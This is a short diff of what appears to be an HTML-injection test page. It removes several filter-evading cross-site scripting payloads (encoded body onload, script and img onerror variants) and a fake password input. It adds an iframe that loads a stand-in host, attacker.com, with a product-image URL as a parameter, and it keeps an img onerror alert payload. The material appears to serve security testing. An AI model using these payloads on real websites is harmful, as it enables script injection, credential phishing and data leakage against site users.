@@ -9,15 +9,7 @@ info:
         <h1>HTML Injection : hacked</h1>
         <h1>HTML Injection : hacked</h1>
         <h1>HTML Injection : hacked</h1>
-        <body%20on%0Dload=alert("1")>
-        <%0dscript>alert(2)
-        <body%%2020on%%0D0Dload=alert("3")>
-        <img/src/onerror=alert(4)> 
-        %3Cimg%2Fsrc%2Fonerror%3Dalert(5)%3E
-        <body%2%0D0on%0%20Dload=alert("6")>
-        <body%09on%0Dload=alert("7")>
-        <h1>HTML Injection : Fake Login</h1>
-        <input type=password name=p>
+<iframe src="http://attacker.com/?url=http://product-images.example.com/products/123"></iframe>
         <img src=x onerror=alert(0)>
     </div>
     <div class="form-container">
